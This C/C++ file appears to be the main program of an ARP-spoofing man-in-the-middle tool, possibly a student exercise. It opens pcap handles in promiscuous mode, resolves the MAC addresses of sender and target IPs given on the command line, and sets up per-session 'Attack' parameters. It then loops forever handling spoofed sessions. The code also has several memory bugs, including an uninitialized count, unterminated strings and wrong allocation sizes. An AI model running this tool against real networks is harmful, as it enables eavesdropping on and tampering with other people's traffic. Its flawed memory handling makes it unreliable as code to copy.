#include "stdafx.h"
using namespace std;

pthread_t thread[PTHREAD_NUM];
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int num_of_parameter = 0;
pid_t pid[SESSION_NUM];
pcap_t* handle[SESSION_NUM];

void terminate_Process(int sig){
	for(int i = 0; i < num_of_parameter; i++){
		kill(pid[i], SIGKILL);
		pthread_join(thread[i], NULL);
	}
	for(int j = 0; j < num_of_parameter; j++){
		pcap_close(handle[j]);
	}
}

char* make_Parameter_REQ(int num, char* at_ip_addr, char* at_mac_addr, char* ip, pcap_t* handles){
	struct Parameter_Pthread* pt2 = (struct Parameter_Pthread*)malloc(sizeof(struct Parameter_Pthread));
	char* temp_mac = (char*)malloc(sizeof(char) * 40);
	if(temp_mac == NULL){ perror("mac malloc error"); exit(1); }

	pt2->sip = (char*)malloc(strlen(at_ip_addr));
	if(pt2->sip == NULL){ perror("pt2->sip malloc error"); exit(1); }
	pt2->smac = (char*)malloc(strlen(at_mac_addr));
	if(pt2->smac == NULL){ perror("pt2->smac malloc error"); exit(1); }

	pt2->tip = (char*)malloc(strlen(ip));
	if(pt2->tip == NULL){ perror("pt2->tip malloc error"); exit(1); }
	pt2->tmac = (char*)malloc(strlen(temp_mac));
	if(pt2->tmac == NULL){ perror("pt2->tmac malloc error"); exit(1); }

	strncpy(pt2->sip, at_ip_addr, strlen(at_ip_addr));
	strncpy(pt2->smac, at_mac_addr, strlen(at_mac_addr));
	strncpy(pt2->tip, ip, strlen(ip));
	strncpy(pt2->tmac, temp_mac, strlen(temp_mac));
	pt2->handle = handles;
	pt2->session_Number = num;

	pthread_create(&thread[num], NULL, find_Mac, (void*)(pt2));
	pthread_join(thread[num], (void**)(&temp_mac));
	return temp_mac;
}


// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// argv[1] : interface
// argv[2] : sender ip1 / argv[3] : target ip1
// argv[2] : sender ip2 / argv[3] : target ip2
// ...
int main(int argc, char* argv[]) {
	if(argc < 3){
		usage();
		perror("Wrong Parameter!");
		exit(0);
	}

// ########## Set sigaction fuction for SIGINT(ctrl + c) ##########
	struct sigaction sa;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = 0;
	sa.sa_handler = terminate_Process;
	if(sigaction(SIGINT, &sa, NULL) == -1){
		perror("sigaction error");
		exit(0);
	}

// ########## Make a pcap environment ##########
	struct bpf_program fp;
	char errbuf[PCAP_ERRBUF_SIZE]; int ret = 0;
	char* dev = pcap_lookupdev(errbuf); char* net; char* mask;
	bpf_u_int32 netp; bpf_u_int32 maskp;
	struct pcap_pkthdr hdr; struct in_addr net_addr, mask_addr;
	int cnt = 2;

	if(dev == NULL) { printf("%s\n", errbuf); exit(1); }
	printf("Dev : %s\n", dev);

	ret = pcap_lookupnet(dev, &netp, &maskp, errbuf);
	if(ret == -1) { printf("%s\n", errbuf); exit(1); }

	net_addr.s_addr = netp;
	net = inet_ntoa(net_addr);
	printf("Net : %s\n", net);

	mask_addr.s_addr = maskp;
	mask = inet_ntoa(mask_addr);
	printf("Mask : %s\n\n", mask);

	char* src_str[num_of_parameter];
	for(int i = 0; i < num_of_parameter; i++){
		src_str[i] = (char*)malloc(sizeof(20));
		strncpy(src_str[i], "src ", 4);
		strncat(src_str[i], argv[cnt], strlen(argv[cnt]));
		cnt += 2;
	}

	cnt = 0;
	// P Mode
	for(int i = 0; i < num_of_parameter; i++){
		handle[i] = pcap_open_live(dev, BUFSIZ, PROMISCUOUS_MODE, 1000, errbuf);
		if (handle[i] == NULL) {
			fprintf(stderr, "handle[%d] couldn't open device %s: %s\n", i, dev, errbuf);
			return -1;
		}
		// 3->filter rule
		if(pcap_compile(handle[i], &fp, src_str[i], 0, netp) == -1){
			printf("Compile ERROR!\n");
			exit(1);
		}
		if(pcap_setfilter(handle[i], &fp) == -1){
			printf("Setfilter ERROR!\n");
			exit(1);
		}
		cnt += 2;
	}
	cnt = 2;
// ########################################

// ########## Make a socket to find my IP & MAC address ##########
	struct Info_mymac* IM = (struct Info_mymac*)malloc(sizeof(struct Info_mymac));
	char* a_mac_addr = (char*)malloc(20);
	if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
	char* s_ip_addr = (char*)malloc(20);
	if(s_ip_addr == NULL){ perror("s_ip_addr malloc error"); exit(1); }
	IM = find_My_Mac();
	strncpy(a_mac_addr, IM->my_mac, strlen(IM->my_mac));
	strncpy(s_ip_addr, IM->my_ip, strlen(IM->my_ip));
	a_mac_addr[12] = '\0';
	printf("[ Success to find my mac address : %s ]\n", a_mac_addr);
// ########################################

// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
// @@@@@@@@@ Management of Sessions @@@@@@@@@
// Session(char* sender_mac, char* sender_ip, char* target_mac, char* target_ip)
	num_of_parameter = (argc-1)/2;
	if(num_of_parameter > 20){
		perror("Overflow of Session!");
		exit(0);
	}

	char* smac[num_of_parameter];
	char* dmac[num_of_parameter];

	Session s[SESSION_NUM];
	char eb[PCAP_ERRBUF_SIZE];
	pcap_t* h = pcap_open_live(dev, BUFSIZ, PROMISCUOUS_MODE, 1000, eb);
	if (h == NULL) {
		fprintf(stderr, "h couldn't open device %s: %s\n", dev, eb);
		return -1;
	}
		
	printf("[ NUM_OF_PRARMETER : %d ]\n", num_of_parameter);
	for(int i = 0; i < num_of_parameter; i++){
		// Find mac using pcap_sendpacket
		smac[i] = (char*)malloc(sizeof(char) * 40);
		if(smac[i] == NULL){ perror("smac malloc error"); exit(1); }
		char* t_smac = (char*)malloc(sizeof(char) * 40);
		if(t_smac == NULL){ perror("t_mac malloc error"); exit(1); }
		t_smac = make_Parameter_REQ(i+1, s_ip_addr, a_mac_addr, argv[cnt], h);
		smac[i] = t_smac;
		printf("[ < %d > Success to find < %s > mac address : %s ]\n", i+1, argv[cnt], smac[i]);

		dmac[i] = (char*)malloc(sizeof(char) * 40);
		if(dmac[i] == NULL){ perror("dmac malloc error"); exit(1); }	
		char* t_dmac = (char*)malloc(sizeof(char) * 40);
		if(t_dmac == NULL){ perror("t_mac malloc error"); exit(1); }
		t_dmac = make_Parameter_REQ(i+1, s_ip_addr, a_mac_addr, argv[cnt+1], h);
		dmac[i] = t_dmac;
		printf("[ < %d > Success to find < %s > mac address : %s ]\n", i+1, argv[cnt+1], dmac[i]);
		printf("%d smac : %s\n", i, smac[i]);
		printf("%d dmac : %s\n", i, dmac[i]);
		cnt += 2;
	}
	pcap_close(h);
	
	cnt = 2;
	struct Parameter_Pthread* pt[num_of_parameter];
	for(int i = 0; i < num_of_parameter; i++){
		pt[i] = (struct Parameter_Pthread*)malloc(sizeof(struct Parameter_Pthread));
		// ########## Make contents of Attack parameters ##########
		pt[i]->sip = (char*)malloc(strlen(argv[cnt]));
		if(pt[i]->sip == NULL){ perror("pt->sip malloc error"); exit(1); }
		pt[i]->smac = (char*)malloc(strlen(a_mac_addr));
		if(pt[i]->smac == NULL){ perror("pt->smac malloc error"); exit(1); }	
		pt[i]->tip = (char*)malloc(strlen(argv[cnt+1]));
		if(pt[i]->tip == NULL){ perror("pt->tip malloc error"); exit(1); }
		pt[i]->tmac = (char*)malloc(strlen(smac[i]));
		if(pt[i]->tmac == NULL){ perror("pt->tmac malloc error"); exit(1); }
		strncpy(pt[i]->sip, argv[cnt+1], strlen(argv[cnt+1]));
		strncpy(pt[i]->smac, a_mac_addr, strlen(a_mac_addr));
		strncpy(pt[i]->tip, argv[cnt], strlen(argv[cnt]));
		strncpy(pt[i]->tmac, smac[i], strlen(smac[i]));
		pt[i]->handle = handle[i];
		pt[i]->session_Number = i+1;
		// ########################################

		// ########## Attack ##########
		s[i].set(i+1, smac[i], argv[cnt], dmac[i], argv[cnt+1], handle[i], a_mac_addr, pt[i]);
		// ########################################
		cnt += 2;
	}

	//for(int z = 0; z < num_of_parameter; z++){
	//	pcap_loop(handle[z], 0, s[z].handle_session, NULL);
	//}	
	while(1){
		for(int i = 0; i < num_of_parameter; i++)		
			s[i].handle_session();
	}
// @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@
// @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
}





